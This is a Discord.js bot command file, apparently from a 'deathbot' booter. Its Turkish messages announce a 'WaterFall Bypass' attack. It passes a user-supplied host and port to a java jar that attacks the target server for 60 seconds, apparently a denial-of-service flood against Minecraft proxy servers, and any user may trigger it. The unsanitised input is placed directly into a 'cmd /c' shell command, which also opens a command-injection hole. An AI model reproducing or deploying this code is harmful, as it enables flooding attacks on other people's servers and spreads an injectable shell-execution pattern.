const Discord = require("discord.js");
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`cmd /c java -jar waterfall.jar ${host} ${port} 6000 60`, (error, stdout, stderr) => {
});
console.log('Bir Saldırı Başlatıldı Discord ID:' +  message.guild.id)
message.channel.send(`**WaterFall Bypass** Saldırısı başlatıldı. **${host}** adresine, **${port}** portlu, sunucuya **60 Saniye** boyunca saldırılacak.`)
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['waterfallBypass', 'waterfallbypass'],
  permLevel: 0
}

exports.help = {
  name: 'WaterFallbypass',
  description: 'Özel',
  usage: 'deathbot'
}